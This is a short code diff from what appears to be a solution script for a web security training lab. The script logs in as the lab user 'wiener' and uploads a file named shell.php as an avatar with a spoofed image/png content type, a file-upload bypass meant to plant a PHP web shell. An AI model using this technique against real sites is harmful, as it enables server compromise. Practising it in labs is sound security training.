@@ -28,8 +28,7 @@ def login(client, host, username, password):
 def upload_file(client, host):    
     files = {'avatar': ('shell.php', open('shell.php', 'rb'), 'image/png')}
     values = {'user': 'wiener', 'csrf': get_csrf_token(client.get(f'{host}/my-account').text)}
-    headers = {'Content-type': 'image/png'}
-    r = client.post(f'{host}/my-account/avatar',files=files, data=values)
+    r = client.post(f'{host}/my-account/avatar', files=files, data=values)
     return r
 
 
